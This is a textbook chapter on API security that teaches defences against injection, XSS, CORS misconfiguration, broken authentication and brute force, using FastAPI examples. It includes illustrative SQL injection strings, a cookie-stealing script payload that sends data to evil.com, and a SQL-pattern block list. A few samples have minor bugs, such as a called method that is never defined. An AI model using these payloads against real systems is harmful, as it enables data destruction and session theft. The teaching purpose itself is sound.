# Chapter 27: API Security

## Why API Security Matters

Production incident, 2:47 AM:

```
Normal API usage: 5,000 requests/second
Suddenly: 500,000 SQL queries/second to database
Result: Database CPU at 100% → Connection pool exhausted → Complete outage

Root cause: Single unvalidated input parameter
Impact: $2M revenue loss, database corruption, customer data exposure
```

A single missing validation check can:
- **Expose customer data** (GDPR violations, lawsuits)
- **Take down production** (injection attacks, resource exhaustion)
- **Enable unauthorized access** (broken authentication)
- **Cost millions** (data breaches, regulatory fines)

API security isn't a checklist. It's defense in depth at every layer.

---

## OWASP API Security Top 10 (2023)

| Risk | Attack Vector | Impact |
|------|---------------|--------|
| Broken Object Level Authorization (BOLA) | Access other users' resources | Data breach |
| Broken Authentication | Weak/missing auth | Account takeover |
| Broken Object Property Level Authorization | Mass assignment | Data modification |
| Unrestricted Resource Access | No rate limiting | DoS |
| Broken Function Level Authorization | Access admin functions | Privilege escalation |
| Server Side Request Forgery (SSRF) | Make server request internal URLs | Internal network access |

**Focus: Input validation, injection prevention, authentication, and authorization.**

---

## Input Validation and Sanitization

### The Problem

```python
# Dangerous: Trust user input
@app.post("/users/search")
def search_users(query: str):
    # NO VALIDATION!
    results = db.execute(f"SELECT * FROM users WHERE name LIKE '%{query}%'")
    return results

# Attack: query = "'; DROP TABLE users; --"
# Result: SQL injection, data loss
```

### Defense: Validate Everything

```
┌─────────────────────────────────────────────────────┐
│                   Request                            │
└─────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────┐
│  1. Type Validation (Pydantic)                       │
│     String/int/email? Required fields?               │
└─────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────┐
│  2. Business Logic Validation                        │
│     Allowed range? Valid enum? Custom rules?         │
└─────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────┐
│  3. Sanitization                                     │
│     Remove dangerous chars, encode for context       │
└─────────────────────────────────────────────────────┘
         │
         ▼
    Process Request
```

### Implementation

```python
from pydantic import BaseModel, Field, validator
import re

class UserSearchRequest(BaseModel):
    query: str = Field(..., min_length=1, max_length=100)
    limit: int = Field(default=10, ge=1, le=100)
    order_by: str = Field(default="created_at")

    @validator('query')
    def validate_query(cls, v):
        # Reject SQL-like patterns
        dangerous = [r'--', r';', r'\/\*', r'\*\/', r'xp_', r'sp_']
        for pattern in dangerous:
            if re.search(pattern, v, re.IGNORECASE):
                raise ValueError(f"Query contains forbidden pattern")
        return v

    @validator('order_by')
    def validate_order_by(cls, v):
        # Whitelist allowed fields
        allowed = {'created_at', 'updated_at', 'name', 'email'}
        if v not in allowed:
            raise ValueError(f"Invalid order_by: {v}")
        return v

# Use parameterized queries
def search_users(request: UserSearchRequest):
    query = """
        SELECT id, name, email FROM users
        WHERE name ILIKE :query
        ORDER BY {order_by}
        LIMIT :limit
    """.format(order_by=request.order_by)  # Safe: whitelisted

    return db.execute(query, {
        'query': f'%{request.query}%',
        'limit': request.limit
    })
```

**Key principles:**
- **Validate at API boundary** (Pydantic)
- **Whitelist, don't blacklist** (allowed values)
- **Parameterize queries** (never concatenation)
- **Sanitize output** (context-appropriate encoding)

---

## SQL Injection Prevention

### How It Works

```python
# Vulnerable
user_input = "admin' OR '1'='1"
query = f"SELECT * FROM users WHERE username = '{user_input}'"
# Becomes: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
# Returns ALL users!
```

### Defense 1: Parameterized Queries

```python
from sqlalchemy import text

# SAFE: Parameters automatically escaped
query = text("SELECT * FROM users WHERE username = :username")
result = db.execute(query, {'username': user_input})

# Even malicious input treated as literal string
```

### Defense 2: ORM

```python
# SQLAlchemy ORM automatically parameterizes
user = db.query(User).filter(User.username == user_input).first()
```

### Defense 3: Whitelist for Non-Parameterizable Items

```python
def get_users_sorted(sort_field: str):
    # SQL params don't work for column names
    allowed_fields = {'id', 'name', 'email', 'created_at'}

    if sort_field not in allowed_fields:
        raise ValueError(f"Invalid sort field")

    query = text(f"SELECT * FROM users ORDER BY {sort_field}")
    return db.execute(query)
```

**Trade-offs:**

| Approach | Security | Flexibility | Performance |
|----------|----------|-------------|-------------|
| Parameterized queries | Excellent | High | Excellent |
| ORM | Excellent | Medium | Good |
| Stored procedures | Excellent | Low | Excellent |

**When to use:** Always use parameterized queries/ORM. Whitelist for column/table names.

---

## Cross-Site Scripting (XSS) Prevention

### The Problem

```python
# Vulnerable: Store malicious content
@app.post("/comments")
def create_comment(content: str):
    db.execute("INSERT INTO comments (content) VALUES (:content)",
               {'content': content})

# Attacker sends:
# content = "<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"

# Frontend renders: <div>{comment.content}</div>
# Script executes! Steals cookies.
```

### Defense: Sanitize Output

```python
import bleach
from pydantic import BaseModel, validator

class CommentResponse(BaseModel):
    id: int
    content: str
    author: str

    @validator('content', 'author')
    def sanitize_html(cls, v):
        # Strip ALL HTML
        return bleach.clean(v, tags=[], strip=True)

        # OR allow safe HTML only
        allowed_tags = ['b', 'i', 'u', 'a', 'p']
        allowed_attrs = {'a': ['href']}
        return bleach.clean(v, tags=allowed_tags, attributes=allowed_attrs)
```

### Content Security Policy

```python
@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)

    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' https://trusted-cdn.com; "
        "img-src 'self' data: https:; "
    )

    return response
```

---

## CORS (Cross-Origin Resource Sharing)

### How CORS Works

```
┌──────────────┐                               ┌──────────────┐
│   Browser    │                               │  API Server  │
│ app.ex.com   │                               │ api.ex.com   │
└──────────────┘                               └──────────────┘
       │
       │  1. Preflight (OPTIONS)
       ├─────────────────────────────────────►
       │  Origin: https://app.example.com
       │  Access-Control-Request-Method: POST
       │
       │  2. Preflight Response
       ◄─────────────────────────────────────┤
       │  Access-Control-Allow-Origin: https://app.example.com
       │  Access-Control-Allow-Methods: GET, POST
       │  Access-Control-Max-Age: 3600
       │
       │  3. Actual Request
       ├─────────────────────────────────────►
       │  Origin: https://app.example.com
       │
       │  4. Response
       ◄─────────────────────────────────────┤
       │  Access-Control-Allow-Origin: https://app.example.com
```

### Secure Configuration

```python
from fastapi.middleware.cors import CORSMiddleware

# INSECURE: Never do this!
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],          # ANY ORIGIN!
    allow_credentials=True,       # With credentials = DANGEROUS
)

# SECURE: Whitelist specific origins
ALLOWED_ORIGINS = [
    "https://app.example.com",
    "https://admin.example.com",
]

if settings.ENVIRONMENT == "development":
    ALLOWED_ORIGINS.append("http://localhost:3000")

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
    max_age=3600,
)
```

**Common mistakes:**

| Mistake | Why Dangerous | Fix |
|---------|---------------|-----|
| `allow_origins=["*"]` with credentials | Any site can read responses | Whitelist specific origins |
| Regex `*.example.com` | Allows `evilexample.com` | Exact string matching |
| Reflecting `Origin` without validation | Any origin allowed | Validate against whitelist |

---

## Authentication: API Keys vs OAuth vs JWT

### 1. API Keys

```python
@app.get("/data")
async def get_data(api_key: str = Header(..., alias="X-API-Key")):
    client = db.query(APIClient).filter(APIClient.key == api_key).first()

    if not client or not client.is_active:
        raise HTTPException(status_code=401, detail="Invalid API key")

    return {"data": "..."}
```

**Pros:** Simple, easy for clients
**Cons:** No expiration, can't represent user permissions
**When to use:** Service-to-service, simple public APIs
**When NOT to use:** User authentication, fine-grained permissions

---

### 2. OAuth 2.0

```python
from fastapi.security import OAuth2PasswordBearer

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

@app.post("/token")
async def login(username: str, password: str):
    user = authenticate_user(username, password)
    if not user:
        raise HTTPException(status_code=401)

    access_token = create_access_token(
        data={"sub": user.id},
        expires_delta=timedelta(minutes=15)
    )

    return {"access_token": access_token, "token_type": "bearer"}

@app.get("/users/me")
async def get_current_user(token: str = Depends(oauth2_scheme)):
    user_info = await validate_oauth_token(token)
    if not user_info:
        raise HTTPException(status_code=401)
    return user_info
```

**OAuth Flow:**

```
Client                          Auth Server              API Server
  │                                  │                       │
  ├─ 1. Request authorization ──────►                       │
  │   (client_id, redirect_uri)      │                       │
  │                                  │                       │
  ◄─ 2. Authorization code ──────────┤                       │
  │                                  │                       │
  ├─ 3. Exchange code for token ─────►                       │
  │   (code, client_secret)          │                       │
  │                                  │                       │
  ◄─ 4. Access token ────────────────┤                       │
  │                                  │                       │
  ├─ 5. API request ─────────────────────────────────────────►
  │   (Authorization: Bearer token)  │                       │
  │                                  │                       │
  ◄─ 6. Protected resource ──────────────────────────────────┤
```

**When to use:** Third-party integrations, delegated authorization
**When NOT to use:** Simple internal APIs

---

### 3. JWT (JSON Web Tokens)

```python
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key"  # Use env variable!
ALGORITHM = "HS256"

def create_jwt_token(user_id: int, permissions: list[str]) -> str:
    payload = {
        "sub": str(user_id),
        "permissions": permissions,
        "exp": datetime.utcnow() + timedelta(hours=1),
        "iss": "api.example.com"
    }
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

def verify_jwt_token(token: str) -> dict:
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")
```

**JWT Structure:**

```
eyJhbGc...   .   eyJzdWI...   .   SflKxwR...
│─────────│      │─────────│      │─────────│
  Header          Payload          Signature
 (Base64)        (Base64)        (HMAC-SHA256)
```

**Pros:** Stateless, contains claims, offline verification
**Cons:** Can't revoke before expiration, larger tokens
**When to use:** Microservices, mobile apps
**When NOT to use:** Need instant revocation

---

### Comparison Table

| Method | Stateless | Revocable | Expiration | Best For | Complexity |
|--------|-----------|-----------|------------|----------|------------|
| **API Keys** | Yes | Manual | No* | Service-to-service | Low |
| **OAuth 2.0** | No | Yes | Yes | Third-party integration | High |
| **JWT** | Yes | No** | Yes | Microservices, mobile | Medium |
| **Session Cookies** | No | Yes | Yes | Traditional web apps | Low |

*Unless manually coded
**Can add blacklist but defeats stateless benefit

---

## Rate Limiting for Security

Security rate limiting prevents brute-force, not just overload.

### Brute-Force Prevention

```python
from collections import defaultdict
from datetime import datetime, timedelta

class BruteForceProtection:
    def __init__(self):
        self.failed_attempts = defaultdict(list)
        self.blocked_until = {}

    def is_blocked(self, identifier: str) -> bool:
        if identifier in self.blocked_until:
            if datetime.utcnow() < self.blocked_until[identifier]:
                return True
            # Unblock
            del self.blocked_until[identifier]
        return False

    def record_failure(self, identifier: str):
        now = datetime.utcnow()
        cutoff = now - timedelta(minutes=15)

        # Keep only recent failures
        self.failed_attempts[identifier] = [
            t for t in self.failed_attempts[identifier] if t > cutoff
        ]
        self.failed_attempts[identifier].append(now)

        # Block after 5 failures
        if len(self.failed_attempts[identifier]) >= 5:
            self.blocked_until[identifier] = now + timedelta(hours=1)

brute_force = BruteForceProtection()

@app.post("/login")
async def login(username: str, password: str, request: Request):
    client_ip = request.client.host

    if brute_force.is_blocked(client_ip):
        raise HTTPException(status_code=429,
                          detail="Too many failed attempts")

    user = authenticate_user(username, password)
    if not user:
        brute_force.record_failure(client_ip)
        brute_force.record_failure(f"user:{username}")
        raise HTTPException(status_code=401)

    brute_force.record_success(client_ip)
    return {"access_token": create_token(user.id)}
```

### Progressive Limits

```python
# Tighter limits on sensitive endpoints
RATE_LIMITS = {
    "/login": "5/minute",           # Brute-force prevention
    "/password-reset": "3/hour",     # Enumeration prevention
    "/api/search": "20/minute",      # Resource-intensive
}

# Different limits by user tier
def get_rate_limit(user: Optional[User]) -> tuple[int, int]:
    if user and user.is_premium:
        return (1000, 60)
    elif user:
        return (100, 60)
    else:
        return (10, 60)  # Anonymous
```

---

## API Versioning and Security

### The Problem

```
Old version: /v1/users/{id}
- Returns sensitive data (SSN, salary)
- No permission checks

New version: /v2/users/{id}
- Returns only public data
- Proper authorization

Problem: Old version still accessible!
Attacker bypasses new security via old version
```

### Secure Deprecation

```python
from enum import Enum

class APIVersion(str, Enum):
    V1 = "v1"
    V2 = "v2"

DEPRECATED_VERSIONS = {
    APIVersion.V1: {
        "sunset_at": datetime(2024, 6, 1),
        "migration_guide": "https://docs.example.com/v1-to-v2"
    }
}

@app.middleware("http")
async def version_deprecation(request, call_next):
    version = request.url.path.split('/')[1]

    if version in DEPRECATED_VERSIONS:
        deprecation = DEPRECATED_VERSIONS[version]

        # Sunset date passed?
        if datetime.utcnow() > deprecation["sunset_at"]:
            return Response(status_code=410, content={
                "error": "version_sunset",
                "migration_guide": deprecation["migration_guide"]
            })

        # Add deprecation headers
        response = await call_next(request)
        response.headers["Deprecation"] = "true"
        response.headers["Sunset"] = deprecation["sunset_at"].isoformat()
        return response

    return await call_next(request)
```

**Deprecation timeline:**

```
Month 0:  v2.0 released, announce v1 deprecation
Month 6:  Warning emails to v1 users
Month 12: v1 returns 410 Gone
Month 18: Remove v1 code
```

---

## Security Headers

```python
@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)

    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000'

    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "frame-ancestors 'none';"
    )

    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'

    return response
```

---

## Key Concepts Checklist

- [ ] Implement layered validation (type → business → sanitization)
- [ ] Use parameterized queries/ORM for SQL injection prevention
- [ ] Sanitize output and set CSP headers for XSS prevention
- [ ] Configure CORS with whitelisted origins (never `*` with credentials)
- [ ] Choose appropriate auth (API keys for services, OAuth for third-party, JWT for stateless)
- [ ] Add rate limiting for brute-force prevention
- [ ] Include security headers on all responses
- [ ] Plan API versioning with clear sunset timeline

---

## Practical Insights

**Defense in depth requires multiple layers:**
```
Layer 1: Input validation at API boundary (Pydantic)
Layer 2: Business logic validation in service layer
Layer 3: Database constraints as last resort
Layer 4: Output sanitization before rendering
Layer 5: Security headers on all responses
```

**Common authentication mistakes:**
```python
# WRONG: Weak hashing
password_hash = hashlib.md5(password.encode()).hexdigest()

# RIGHT: Use bcrypt/argon2
from passlib.context import CryptContext
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
password_hash = pwd_context.hash(password)
```

**JWT best practices:**
- Short expiration (15 min access, 30 day refresh)
- Store refresh tokens in database for revocation
- Rotate secret keys periodically
- Use RS256 for microservices (asymmetric)

**Security monitoring alerts:**
```
Alert on:
- Login failure rate > 5% (credential stuffing)
- 401/403 spike (unauthorized access attempts)
- SQL patterns in params (injection attempts)
- Rate limit hits from single IP (automated attack)

Track:
- Time to detect incident
- Time to patch vulnerability
- API key rotation frequency
- Traffic on latest API version %
```

**API key best practices:**
- Generate with cryptographically secure random
- Store hashed like passwords
- Support rotation without downtime
- Include prefix for identification (`sk_live_...`)
- Log all usage for audit trail
